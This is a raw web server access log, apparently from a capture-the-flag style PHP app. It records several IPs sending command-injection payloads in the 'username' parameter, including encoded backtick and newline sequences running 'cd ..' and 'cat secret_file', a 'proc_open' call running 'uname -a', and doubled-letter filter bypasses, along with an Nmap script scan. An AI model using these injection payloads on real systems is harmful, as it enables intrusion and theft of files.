58.187.43.105 - - [28/Aug/2022:08:55:09 +0000] "GET /index.php?username=%2525%2536%2530%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2561%2574%2525%2530%2539%2573%2565%2563%2572%2565%2574%255f%2566%2569%256c%2565%2525%2536%2530&type=toilet HTTP/1.1" 200 2042 "http://128.199.190.141:5551/?" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:55:15 +0000] "GET /index.php?username=%2525%2536%2530%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2561%2574%2525%2530%2539%2573%2565%2563%2572%2565%2574%255f%2566%2569%256c%2565%2525%2536%2530&type=toilet HTTP/1.1" 200 2042 "http://128.199.190.141:5551/index.php?username=%2525%2536%2530%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2564%2525%2530%2539%2525%2532%2565%2525%2532%2565%2525%2530%2541%2563%2561%2574%2525%2530%2539%2573%2565%2563%2572%2565%2574%255f%2566%2569%256c%2565%2525%2536%2530&type=toilet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:55:17 +0000] "GET /index.php?username=asd&type=figlet HTTP/1.1" 200 1196 "http://128.199.190.141:5551/index.php?username=%27ccdd%09..%0Accdd%09..%0Accdd%09..%0Accatat%09secret_fisecret_filele%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:55:18 +0000] "GET /index.php?username=%60cd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acat%09secret_file%60&type=gnu HTTP/1.1" 200 1310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:55:24 +0000] "GET /index.php?username=%27ccdd%09..%0Accdd%09..%0Accdd%09..%0Accatat%09secret_fisecret_filele%0A&type=figlet HTTP/1.1" 200 1100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:55:25 +0000] "GET / HTTP/1.0" 200 3662 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:55:34 +0000] "GET /index.php?username=proc_open%28%22uname+-a%22%2Carray%28%29%2C%24something%29&type=gnu HTTP/1.1" 200 1284 "http://128.199.190.141:5551/index.php?username=%40&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:55:34 +0000] "GET /index.php?username=%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acat%09secret_file%60&type=gnu HTTP/1.1" 200 1310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:55:58 +0000] "GET / HTTP/1.1" 200 1221 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:56:05 +0000] "GET / HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:56:06 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:56:10 +0000] "GET /index.php?username='cd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acat%09secret_file%60&type=gnu HTTP/1.1" 200 1314 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:56:15 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:56:15 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:56:17 +0000] "GET /favicon.ico HTTP/1.1" 404 496 "http://128.199.190.141:5551/?debug" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:56:35 +0000] "GET /index.php?username=%25%36%30%25%36%30&type=random HTTP/1.1" 200 1191 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "GET /.git/HEAD HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "GET /nmaplowercheck1661677005 HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET /browseDirectory.jsp HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "OPTIONS / HTTP/1.1" 200 3062 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "PROPFIND / HTTP/1.1" 200 3252 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "GET / HTTP/1.1" 200 3153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "PROPFIND / HTTP/1.1" 200 2862 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET /HNAP1 HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "GET /rs-status HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET /tasktracker.jsp HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "OPTIONS / HTTP/1.1" 200 2742 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET /master.jsp HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "OPTIONS / HTTP/1.1" 200 3684 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET /jobtracker.jsp HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET /favicon.ico HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET /evox/about HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "DLFZ / HTTP/1.1" 200 3242 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "POST / HTTP/1.1" 200 3112 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "GET /status.jsp HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "GET / HTTP/1.1" 200 2988 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "OPTIONS / HTTP/1.1" 200 3052 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:45 +0000] "OPTIONS / HTTP/1.1" 200 2922 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "GET / HTTP/1.0" 200 2832 "-" "-"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "GET /flumemaster.jsp HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:45 +0000] "POST /sdk HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:46 +0000] "GET /robots.txt HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:46 +0000] "GET /dfshealth.jsp HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:46 +0000] "OPTIONS / HTTP/1.1" 200 3248 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:46 +0000] "PROPFIND / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:46 +0000] "OPTIONS / HTTP/1.1" 200 3506 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:46 +0000] "OPTIONS / HTTP/1.1" 200 3219 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:46 +0000] "OPTIONS / HTTP/1.1" 200 4982 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:46 +0000] "OPTIONS / HTTP/1.1" 200 2982 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:46 +0000] "\x16\x03\x01\x02" 400 484 "-" "-"
58.187.43.105 - - [28/Aug/2022:08:56:46 +0000] "OPTIONS / HTTP/1.1" 200 3082 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:47 +0000] "HEAD / HTTP/1.1" 200 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:47 +0000] "POST / HTTP/1.1" 200 3098 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
14.161.31.188 - - [28/Aug/2022:08:56:47 +0000] "OPTIONS / HTTP/1.1" 200 3042 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
58.187.43.105 - - [28/Aug/2022:08:56:47 +0000] "GET / HTTP/1.0" 200 2852 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:56:47 +0000] "GET / HTTP/1.1" 200 2925 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:56:50 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes HTTP/1.1" 200 1056 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:56:57 +0000] "-" 408 0 "-" "-"
171.253.1.35 - - [28/Aug/2022:08:57:07 +0000] "GET /index.php?username=%5c%25%36%30%5c%25%36%30&type=random HTTP/1.1" 200 1156 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:57:11 +0000] "GET /index.php?username=ccat&type=figlet HTTP/1.1" 200 1480 "http://128.199.190.141:5551/index.php?username=ccatat&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:57:29 +0000] "GET / HTTP/1.1" 206 3046 "-" "ZaloPC-win32-24v473"
171.253.1.35 - - [28/Aug/2022:08:57:42 +0000] "GET /index.php?username=%5c%60%25%36%30%5c%60%25%36%30&type=random HTTP/1.1" 200 1144 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:58:03 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:58:12 +0000] "GET /index.php?debug HTTP/1.1" 200 2654 "http://128.199.190.141:5551/index.php?username=%60cd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acat%09secret_file%60&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:58:19 +0000] "GET /index.php?username=cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:58:20 +0000] "GET /index.php?username=ls&type=gnu HTTP/1.1" 200 1272 "http://128.199.190.141:5551/index.php?username=proc_open%28%22uname+-a%22%2Carray%28%29%2C%24something%29&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:58:28 +0000] "GET /index.php?username=cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=gnu HTTP/1.1" 200 1342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:58:38 +0000] "GET /index.php?username=%3B+ls&type=gnu HTTP/1.1" 200 1276 "http://128.199.190.141:5551/index.php?username=ls&type=gnu" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:58:44 +0000] "GET /index.php?username=%2f%60%25%36%30%2f%60%25%36%30&type=random HTTP/1.1" 200 1353 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:58:45 +0000] "GET /index.php?username=`&type=figlet HTTP/1.1" 200 1121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:58:47 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1099 "http://128.199.190.141:5551/index.php?username=ccat&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:58:51 +0000] "GET /index.php?debug HTTP/1.1" 200 2690 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:59:05 +0000] "GET /index.php?username=%&type=figlet HTTP/1.1" 200 1121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:08:59:08 +0000] "GET /index.php?username=%2f%2f%2f%5c%5c&type=random HTTP/1.1" 200 1177 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:08:59:14 +0000] "GET /index.php HTTP/1.1" 200 1195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:08:59:14 +0000] "GET /style.css HTTP/1.1" 200 955 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:08:59:14 +0000] "GET /demo.png HTTP/1.1" 200 103051 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:08:59:14 +0000] "GET /favicon.ico HTTP/1.1" 404 495 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:08:59:19 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:08:59:20 +0000] "GET /index.php?username=ls&type=figlet HTTP/1.1" 200 1485 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:08:59:25 +0000] "GET /index.php?username=%60&type=figlet HTTP/1.1" 200 1121 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:59:30 +0000] "GET /index.php?username=cd&type=figlet HTTP/1.1" 200 1458 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:08:59:39 +0000] "-" 408 0 "-" "-"
171.253.1.35 - - [28/Aug/2022:08:59:43 +0000] "GET /index.php?username=%2f%2f%2f%5c%5c%2f%2f%2f%60%60&type=random HTTP/1.1" 200 1238 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:08:59:43 +0000] "GET /index.php?username=%60cd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acd%09%2e%2e%0Acat%09secret_file%60&type=figlet HTTP/1.1" 200 1837 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:08:59:44 +0000] "GET /index.php?username=lls&type=random HTTP/1.1" 200 1646 "http://128.199.190.141:5551/index.php?username=ls&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
171.253.1.35 - - [28/Aug/2022:08:59:59 +0000] "GET /index.php?username=%2f%2f%2f%5c%5c%2f%2f%2f%60%60&type=figlet HTTP/1.1" 200 1141 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
